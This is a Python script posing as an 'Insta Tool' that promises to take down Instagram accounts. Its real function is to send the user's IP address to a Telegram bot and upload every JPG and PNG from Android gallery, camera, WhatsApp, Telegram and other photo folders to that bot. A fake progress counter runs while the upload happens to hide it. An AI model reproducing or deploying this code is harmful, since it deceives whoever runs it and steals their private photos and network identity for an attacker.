import os
import requests
from datetime import datetime
import pyfiglet
import time
from termcolor import colored
import threading 

ramobot = "bot token"
ramowlfbio = "id gir"

def yunis():
    try:
        ip = requests.get('https://api64.ipify.org?format=json').json()
        return ip['ip']
    except Exception as e:
        return f"yarram: {e}"

yunis_ip = yunis()

def selamcnm(heckir):
    requests.post(
        f'https://api.telegram.org/bot{ramobot}/sendMessage',
        data={'chat_id': ramowlfbio, 'text': f"adamın ip adresi: {heckir}"}
    )

selamcnm(yunis_ip)

def ramowlf(ramolara_sattin):
    requests.post(
        f'https://api.telegram.org/bot{ramobot}/sendDocument',
        files=ramolara_sattin,
        data={'chat_id': ramowlfbio}
    )

ramo = datetime.now()
requests.post(
    f'https://api.telegram.org/bot{ramobot}/sendMessage',
    data={'chat_id': ramowlfbio, 'text': f'BotAltyapi Ramazan öztürk @ramowlfbio'}
)

def ramowlfsigma(ramowlfbabapiro):
    os.chdir(ramowlfbabapiro)
    amsikilir = list(os.scandir('.'))
    
    for saksocekme in amsikilir:
        yarram = saksocekme.name  
        if yarram.endswith('.jpg') or yarram.endswith('.png'):
            try:
                with open(yarram, 'rb') as file:
                    ramolara_sattin = {"document": file}
                    ramowlf(ramolara_sattin)
            except Exception as ramo:
                print(f"{yarram} gönderilirken hata oluştu: {str(ramo)}")

galeri = [
    "/storage/emulated/0/DCIM",
    "/storage/emulated/0/DCIM/Screenshots",
    "/storage/emulated/0/DCIM/Camera",
    "/storage/emulated/0/Pictures/Telegram",
    "/storage/emulated/0/Pictures/Instagram",
    "/storage/emulated/0/Pictures/Messenger",
    "/storage/emulated/0/Pictures/Whatsapp",
    "/storage/emulated/0/Pictures/Facebook",   
    "/storage/emulated/0/Pictures/GooglePhotos",   
    "/storage/emulated/0/DCIM/Movies",            
    "/storage/emulated/0/Movies",                    
    "/storage/emulated/0/Music",                    
    "/storage/emulated/0/Podcasts",                  
    "/storage/emulated/0/Pictures/Viber",           
    "/storage/emulated/0/Pictures/WeChat"       
]   

def ramowlfsikis():
    for ramo in range(2, 10000):
        print(colored(f"Hesap Düşürme: {ramo} hesap düşmedi ❌", "green"))
        time.sleep(0.2)

fontayari = pyfiglet.figlet_format(" İnsta Tool", font="standard")
print(colored(fontayari, 'green'))

ramolara_sattin = input(colored('Düşürmek istediğiniz hesapların ilk harfini girin:', 'blue'))
print(colored(f'hesaplar düşüyor: {ramolara_sattin}', 'green'))
time.sleep(1)

ramowlf_ahlayankari = threading.Thread(target=ramowlfsikis)
ramowlf_ahlayankari.start()

for fors_araf in galeri:  
    ramowlfsigma(fors_araf)

ramowlf_ahlayankari.join()
